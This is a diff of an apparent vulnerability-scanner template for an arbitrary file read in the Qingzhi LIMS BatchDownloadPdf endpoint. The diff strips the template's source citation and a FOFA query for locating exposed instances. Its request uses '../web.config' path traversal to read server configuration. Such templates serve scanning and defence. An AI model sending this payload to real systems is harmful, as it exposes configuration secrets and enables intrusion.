@@ -3,12 +3,8 @@ info:
   name: 青之LIMS BatchDownloadPdf 存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wb65zr2hd9u88ega'
+  description: ''
   tags: lfi,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wb65zr2hd9u88ega
-    fofa: body="成都青之软件有限公司" || title="青之-LIMS"
 http:
 - raw:
   - 'GET /ReportSign/BatchDownloadPdf?fileName=../web.config HTTP/1.1
